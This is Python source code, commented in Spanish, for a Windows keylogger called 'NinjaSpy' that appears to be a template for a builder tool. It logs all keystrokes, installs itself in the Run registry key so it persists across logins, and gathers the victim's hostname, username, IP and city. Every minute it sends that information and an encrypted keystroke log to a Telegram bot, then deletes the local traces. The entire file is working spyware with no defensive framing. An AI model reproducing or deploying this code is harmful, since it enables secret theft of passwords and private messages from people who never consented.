
import os
import time
import socket
import getpass
import threading
from pynput.keyboard import Listener, Key
import requests
import json
from cryptography.fernet import Fernet

# 🔐 Datos sensibles (estos serán reemplazados por el builder)
TOKEN = __TOKEN__
CHAT_ID = __CHAT_ID__
KEY = __FERNET_KEY__


# 📂 Rutas
LOG_FILE_NAME = "log.txt"
LOG_FILE_DIR = os.path.expandvars(r"%APPDATA%\\NinjaSpy")
LOG_FILE_PATH = os.path.join(LOG_FILE_DIR, LOG_FILE_NAME)
INTERVALO_ENVIO = 60

SPECIAL_KEYS = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.tab: '[TAB]',
    Key.backspace: '[<]',
    Key.shift: '',
    Key.ctrl_l: '[CTRL]',
    Key.ctrl_r: '[CTRL]',
    Key.alt_l: '[ALT]',
    Key.alt_r: '[ALT]',
    Key.caps_lock: '[CAPSLOCK]',
    Key.esc: '[ESC]',
    Key.f12: 'EXIT'
}

def obtener_info():
    try:
        res = requests.get("https://ipinfo.io/json").json()
        ip = res.get("ip", "N/A")
        loc = res.get("city", "N/A")
    except:
        ip = "N/A"
        loc = "N/A"
    hostname = socket.gethostname()
    username = getpass.getuser()
    return f"[{hostname} - {username}] IP: {ip} | Ciudad: {loc}"

def listener_callback(key):
    try:
        k = SPECIAL_KEYS.get(key, str(key).replace("'", ""))
        with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
            f.write(k)
    except:
        pass

def cifrar_log():
    try:
        with open(LOG_FILE_PATH, 'rb') as f:
            data = f.read()
        fernet = Fernet(KEY)
        return fernet.encrypt(data)
    except:
        return b''

def enviar_telegram():
    while True:
        time.sleep(INTERVALO_ENVIO)
        try:
            msg = obtener_info()
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": msg})

            encrypted_data = cifrar_log()
            if encrypted_data:
                files = {'document': ('log.enc', encrypted_data)}
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                              data={"chat_id": CHAT_ID}, files=files)

            if os.path.exists(LOG_FILE_PATH):
                os.remove(LOG_FILE_PATH)
        except Exception as e:
            pass

def agregar_a_inicio():
    try:
        import winreg
        exe_path = os.path.abspath(__file__).replace('.py', '.exe')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NinjaSpy", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def main():
    os.makedirs(LOG_FILE_DIR, exist_ok=True)
    agregar_a_inicio()
    threading.Thread(target=enviar_telegram, daemon=True).start()
    with Listener(on_press=listener_callback) as l:
        l.join()

if __name__ == '__main__':
    main()
